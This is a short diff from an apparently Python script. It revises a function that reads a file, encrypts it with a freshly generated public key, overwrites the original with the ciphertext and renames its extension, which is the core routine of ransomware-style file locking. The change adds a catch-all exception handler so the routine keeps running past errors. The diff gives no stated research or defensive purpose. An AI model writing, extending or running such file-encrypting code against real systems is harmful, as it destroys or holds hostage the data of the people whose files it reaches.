@@ -48,13 +48,16 @@ def pad(data):
 
 
 def encrypt_file(filename):
-    with open(filename, 'rb') as f:
-        plaintext = f.read()
-    private_key, public_key = generate_key()
-    payload_msg = encrypt(plaintext, public_key)
-    with open(filename, "wb") as f:
-        f.write(payload_msg)
-    change_extension(filename)
+    try:
+        with open(filename, 'rb') as f:
+            plaintext = f.read()
+        private_key, public_key = generate_key()
+        payload_msg = encrypt(plaintext, public_key)
+        with open(filename, "wb") as f:
+            f.write(payload_msg)
+        change_extension(filename)
+    except BaseException as bex:
+        print("Don't encrypt" + str(bex))
 
 
 def change_extension(filename):
